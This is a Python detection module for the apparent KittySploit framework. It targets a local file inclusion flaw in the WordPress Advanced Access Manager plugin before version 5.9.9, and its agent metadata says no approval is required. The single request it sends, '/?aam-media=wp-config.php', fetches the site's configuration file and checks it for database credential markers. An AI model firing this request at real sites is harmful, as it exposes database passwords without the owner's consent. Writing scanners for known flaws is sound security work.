#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Advanced Access Manager versions before 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Advanced Access Manager < 5.9.9 - Local File Inclusion Detection',
        'description': 'WordPress Advanced Access Manager versions before 5.9.9 are vulnerable to local file inclusion and allows attackers to download the wp-config.php file and get access to the database, which is publicly reachable on many servers.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp-plugin', 'lfi', 'wp', 'accessmanager', 'wpscan', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/9873',
            'https://id.wordpress.org/plugins/advanced-access-manager/',
            'https://wpscan.com/vulnerability/dfe62ff5-956c-4403-b3fd-55677628036b',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/?aam-media=wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WordPress Advanced Access Manager < 5.9.9 - Local File Inclusion detected",
                path='/?aam-media=wp-config.php',
            )
            return True
        return False

